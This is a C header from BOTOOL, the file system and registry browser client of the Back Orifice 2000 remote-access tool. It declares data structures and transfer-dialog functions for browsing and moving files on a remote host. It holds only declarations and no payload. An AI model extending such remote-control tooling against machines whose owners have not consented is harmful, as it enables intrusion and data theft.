/*  BOTOOL - Back Orifice 2000 File System and Registry Browser/Editor
    Copyright (C) 1999, L0pht Heavy Industries, Inc.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#ifndef __INC_CMD_EXPLORE_H
#define __INC_CMD_EXPLORE_H

#include<windows.h>
#include<commctrl.h>

#define EXFI_A FILE_ATTRIBUTE_ARCHIVE
#define EXFI_R FILE_ATTRIBUTE_READONLY
#define EXFI_S FILE_ATTRIBUTE_SYSTEM
#define EXFI_H FILE_ATTRIBUTE_HIDDEN
#define EXFI_D FILE_ATTRIBUTE_DIRECTORY
#define EXFI_C FILE_ATTRIBUTE_COMPRESSED
#define EXFI_T FILE_ATTRIBUTE_TEMPORARY

typedef struct __exfileinfo {
	char svName[260];
	char svShortName[13];
	DWORD dwSize;
	int nType;
	SYSTEMTIME stTime;
	DWORD dwFlags;
	struct __exfileinfo *pNext;
} EXFILEINFO;

typedef struct {
	// Windows
	HWND hParent;
	HWND hDialog;
	HWND hStatus;
	HICON hGoIcon;
	HICON hGoUpIcon;
	HICON hLargeIcon;
	HICON hSmallIcon;
	HMENU hDlgMenu;
	HIMAGELIST hImageList;
	HIMAGELIST hImageListSm;
	
	// Misc
	char svOldName[261];
	char svAddress[256];
	char svLocation[261];
	CAuthSocket *pSock;
	
	EXFILEINFO *pFiles;

	int  nLastSort;
	BOOL bSortDir[5];

	// Fake clipboard
	BOOL bCut;
	char *svClipboard;

	// Property page
	EXFILEINFO *pexfi;
	SHFILEINFO *pshfi;
	DWORD dwNewAttr;
	
	// Transfer options
	char svConnectStr[260];
	char svBindStr[260];
	BOOL bRandomBind;

} EXPLORE_CONTEXT;

int CreateExploreClient(HWND hParent);

HWND CreateXferDialog(HINSTANCE hInst, HWND hParent);
void XferDlg_SetSrcFile(HWND hwndXfer,char *svSrcPath, char *svAddr);
void XferDlg_SetDstFile(HWND hwndXfer,char *svDstPath, char *svAddr);
void XferDlg_SetTotalSize(HWND hwndXfer,DWORD dwTotalSize);
void XferDlg_SetCount(HWND hwndXfer,DWORD dwCount);
BOOL PumpXferDialog(HWND hwndXfer);

#endif